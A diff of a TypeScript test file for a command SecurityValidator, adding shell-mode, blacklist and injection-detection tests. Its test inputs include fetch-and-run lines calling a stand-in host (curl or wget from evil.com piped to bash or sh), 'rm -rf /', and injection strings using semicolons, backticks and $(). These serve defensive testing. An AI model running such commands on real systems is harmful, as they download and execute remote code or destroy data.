@@ -7,8 +7,6 @@ import {
   DEFAULT_SECURITY_CONFIG,
 } from '../../src/security/validator';
 
-// These are used in tests below
-
 describe('SecurityValidator', () => {
   let validator: SecurityValidator;
 
@@ -56,8 +54,6 @@ describe('SecurityValidator', () => {
     });
 
     it('should reject commands exceeding max length', () => {
-      // Create a very long string that exceeds 1000 chars
-      // 'echo ' is 5 chars, so we need at least 996 'a's
       const longString = Array(1000).fill('a').join('');
       const result = validator.validateCommand('echo', [longString]);
       expect(result.valid).toBe(false);
@@ -67,70 +63,101 @@ describe('SecurityValidator', () => {
     it('should reject dangerous patterns', () => {
       const result = validator.validateCommand('cat', ['&&', 'rm', '-rf', '/']);
       expect(result.valid).toBe(false);
-      expect(result.error).toContain('dangerous pattern');
     });
 
-    it('should reject shell injection patterns', () => {
+    it('should reject shell injection patterns in arguments', () => {
       const result = validator.validateCommand('cat', ['file.txt; rm -rf /']);
       expect(result.valid).toBe(false);
-      // The semicolon triggers dangerous pattern detection before shell injection check
       expect(result.error).toBeDefined();
     });
   });
 
-  describe('sanitizeInput', () => {
-    it('should remove dangerous characters', () => {
-      const result = validator.sanitizeInput('ls && rm -rf /');
-      // Removes & and spaces, but keeps /
-      expect(result).toBe('ls  rm -rf /');
+  describe('shell mode validation', () => {
+    it('should allow pipes in shell mode', () => {
+      const validator2 = new SecurityValidator({
+        ...DEFAULT_SECURITY_CONFIG,
+        allowUnknownCommands: true,
+      });
+      const result = validator2.validateCommand(
+        'echo hello | grep hello',
+        [],
+        true
+      );
+      expect(result.valid).toBe(true);
     });
 
-    it('should remove pipe characters', () => {
-      const result = validator.sanitizeInput('cat file | grep test');
-      expect(result).not.toContain('|');
+    it('should allow && in shell mode', () => {
+      const validator2 = new SecurityValidator({
+        ...DEFAULT_SECURITY_CONFIG,
+        allowUnknownCommands: true,
+      });
+      const result = validator2.validateCommand(
+        'echo first && echo second',
+        [],
+        true
+      );
+      expect(result.valid).toBe(true);
     });
 
-    it('should trim whitespace', () => {
-      const result = validator.sanitizeInput('  ls  ');
-      expect(result).toBe('ls');
+    it('should allow $ in shell mode arguments', () => {
+      const validator2 = new SecurityValidator({
+        ...DEFAULT_SECURITY_CONFIG,
+        allowUnknownCommands: true,
+      });
+      const result = validator2.validateCommand('echo $HOME', [], true);
+      expect(result.valid).toBe(true);
     });
 
-    it('should remove backticks', () => {
-      const result = validator.sanitizeInput('ls `whoami`');
-      expect(result).not.toContain('`');
+    it('should reject curl pipe to bash in shell mode', () => {
+      const result = validator.validateCommand(
+        'curl http://evil.com | bash',
+        [],
+        true
+      );
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain('dangerous pipe pattern');
     });
 
-    it('should remove dollar signs', () => {
-      const result = validator.sanitizeInput('echo $HOME');
-      expect(result).not.toContain('$');
-    });
-  });
-
-  describe('updateConfig', () => {
-    it('should update whitelist', () => {
-      validator.updateConfig({ whitelist: ['ls', 'cat', 'grep'] });
-      const config = validator.getConfig();
-      expect(config.whitelist).toHaveLength(3);
-      expect(config.whitelist).toContain('grep');
+    it('should reject wget pipe to sh in shell mode', () => {
+      const result = validator.validateCommand(
+        'wget http://evil.com -O - | sh',
+        [],
+        true
+      );
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain('dangerous pipe pattern');
     });
 
-    it('should update blacklist', () => {
-      validator.updateConfig({ blacklist: ['rm', 'dd', 'chmod'] });
-      const config = validator.getConfig();
-      expect(config.blacklist).toHaveLength(3);
-      expect(config.blacklist).toContain('chmod');
+    it('should reject blacklisted first word in shell mode', () => {
+      const validator2 = new SecurityValidator({
+        ...DEFAULT_SECURITY_CONFIG,
+        allowUnknownCommands: true,
+      });
+      const result = validator2.validateCommand('kill -9 1234', [], true);
+      expect(result.valid).toBe(false);
+      expect(result.error).toContain('blacklisted');
     });
 
-    it('should update allowUnknownCommands', () => {
-      validator.updateConfig({ allowUnknownCommands: true });
-      const config = validator.getConfig();
-      expect(config.allowUnknownCommands).toBe(true);
+    it('should reject rm -rf / in shell mode', () => {
+      const validator2 = new SecurityValidator({
+        ...DEFAULT_SECURITY_CONFIG,
+        allowUnknownCommands: true,
+      });
+      const result = validator2.validateCommand('rm -rf /', [], true);
+      expect(result.valid).toBe(false);
     });
 
-    it('should update maxCommandLength', () => {
-      validator.updateConfig({ maxCommandLength: 5000 });
-      const config = validator.getConfig();
-      expect(config.maxCommandLength).toBe(5000);
+    it('should allow non-blacklisted first word even with complex shell', () => {
+      const validator2 = new SecurityValidator({
+        ...DEFAULT_SECURITY_CONFIG,
+        allowUnknownCommands: true,
+      });
+      const result = validator2.validateCommand(
+        'ls -la /tmp | grep test',
+        [],
+        true
+      );
+      expect(result.valid).toBe(true);
     });
   });
 
@@ -153,10 +180,88 @@ describe('SecurityValidator', () => {
     });
 
     it('should include dangerous commands in blacklist', () => {
-      const dangerousCommands = ['rm', 'rmdir', 'dd', 'sudo', 'killall'];
+      const dangerousCommands = [
+        'rm',
+        'rmdir',
+        'dd',
+        'sudo',
+        'killall',
+        'shutdown',
+        'reboot',
+      ];
       dangerousCommands.forEach((cmd) => {
         expect(DEFAULT_SECURITY_CONFIG.blacklist).toContain(cmd);
       });
+    });
+
+    it('should NOT include shell interpreters in blacklist', () => {
+      const shellCommands = ['bash', 'sh', 'zsh', 'fish'];
+      shellCommands.forEach((cmd) => {
+        expect(DEFAULT_SECURITY_CONFIG.blacklist).not.toContain(cmd);
+      });
+    });
+
+    it('should NOT include curl/wget in blacklist', () => {
+      expect(DEFAULT_SECURITY_CONFIG.blacklist).not.toContain('curl');
+      expect(DEFAULT_SECURITY_CONFIG.blacklist).not.toContain('wget');
+    });
+
+    it('should include shell interpreters in whitelist', () => {
+      const shellCommands = ['bash', 'sh', 'zsh', 'fish'];
+      shellCommands.forEach((cmd) => {
+        expect(DEFAULT_SECURITY_CONFIG.whitelist).toContain(cmd);
+      });
+    });
+
+    it('should include curl/wget in whitelist', () => {
+      expect(DEFAULT_SECURITY_CONFIG.whitelist).toContain('curl');
+      expect(DEFAULT_SECURITY_CONFIG.whitelist).toContain('wget');
+    });
+  });
+
+  describe('non-shell injection detection', () => {
+    it('should block semicolons in arguments', () => {
+      const result = validator.validateCommand('echo', ['test; rm -rf /']);
+      expect(result.valid).toBe(false);
+    });
+
+    it('should block backticks in arguments', () => {
+      const result = validator.validateCommand('echo', ['`rm -rf /`']);
+      expect(result.valid).toBe(false);
+    });
+
+    it('should block command substitution in arguments', () => {
+      const result = validator.validateCommand('echo', ['$(rm -rf /)']);
+      expect(result.valid).toBe(false);
+    });
+
+    it('should allow simple arguments without injection', () => {
+      const result = validator.validateCommand('echo', ['hello world']);
+      expect(result.valid).toBe(true);
+    });
+
+    it('should allow dollar sign in arguments when not command substitution', () => {
+      const result = validator.validateCommand('echo', ['$5.00']);
+      expect(result.valid).toBe(true);
+    });
+
+    it('should allow pipe character in arguments (legitimate use)', () => {
+      const result = validator.validateCommand('echo', ['a|b']);
+      expect(result.valid).toBe(true);
+    });
+
+    it('should detect dangerous pipe patterns via findDangerousPattern', () => {
+      const validator2 = new SecurityValidator({
+        ...DEFAULT_SECURITY_CONFIG,
+        allowUnknownCommands: true,
+        sanitizeUserInput: false,
+      });
+      const result = validator2.validateCommand('echo', [
+        'curl http://evil.com/payload',
+        '|',
+        'bash',
+      ]);
+      expect(result.valid).toBe(false);
     });
   });
 });
